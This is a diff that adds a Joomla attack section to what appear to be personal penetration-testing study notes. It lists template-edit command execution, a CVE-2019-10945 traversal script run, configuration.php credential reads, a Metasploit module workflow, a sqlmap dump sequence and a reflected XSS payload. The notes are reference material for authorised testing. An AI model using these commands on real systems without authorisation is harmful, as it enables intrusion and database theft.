@@ -186,8 +186,64 @@ curl -s <URL>/logs/debug.log
 
 > `configuration.php` exposure and CVE-2023-23752 both leak DB credentials — critical findings. Brute-force and SQLi are intrusive: scope + approval only.
 
+## Joomla — attacking (reference)
+Intrusive — scope + approval. Target `<URL>`, attacker `<LHOST>`.
+
+### Authenticated template RCE
+Log in to `/administrator`, edit a template PHP file (e.g. `error.php`) to run commands via a non-standard param, then clean up.
+```bash
+curl -s "<URL>/templates/<template>/error.php?<rand>=id"
+```
+Fix: lock down template editing, restrict admin panel access.
+
+### CVE-2019-10945 — core directory traversal + file deletion
+```bash
+python2.7 joomla_dir_trav.py --url "<URL>/administrator/" --username admin --password admin --dir /
+```
+Can read/list sensitive files like `configuration.php`.
+
+### Config exposure
+```bash
+curl -s <URL>/configuration.php        # DB creds if readable
+```
+
+### Extension exploitation
+Enumerate extensions → research the specific version → craft the exploit against the component path. Extensions are the most common Joomla attack vector.
+
+### Metasploit
+```text
+search joomla
+use exploit/unix/webapp/joomla_<module>
+set RHOSTS <IP> ; set TARGETURI /administrator/
+set USERNAME admin ; set PASSWORD <pass>
+set LHOST <LHOST> ; run
+```
+
+### SQLi → DB dump (sqlmap workflow)
+```bash
+sqlmap -u "<URL>/index.php?id=1" --dbs --batch
+sqlmap -u "<URL>/index.php?id=1" -D <db> --tables --batch
+sqlmap -u "<URL>/index.php?id=1" -D <db> -T <table> --columns --batch
+sqlmap -u "<URL>/index.php?id=1" -D <db> -T <table> -C <cols> --dump --batch
+```
+
+### REST API / XSS / CLI
+```bash
+curl -s <URL>/api/index.php/v1/users                      # enum/modify if enabled
+curl "<URL>/index.php?param=<script>alert(1)</script>"    # reflected XSS test
+joomla user:list                                          # if shell access
+```
+
+### Post-exploitation
+Generic, not Joomla-specific — see the dedicated modules:
+- Privesc enum: `linpeas.sh` (Linux, module 25) / `winpeas.exe` (Windows, module 26)
+- Pivoting (chisel, sshuttle): module 12 → `cheatsheets/pivoting.md`
+
+### Web shells
+Obfuscated shell generation/detection is covered once in the WordPress section above (I don't store working payloads). Same technique applies here.
+
 ### My notes / lab output
-Filled in once I run this on a WordPress target.
+Filled in once I run this on a WordPress or Joomla target.
 
 ## 2. Setup
 - Attack box: (Pwnbox / Kali VM)
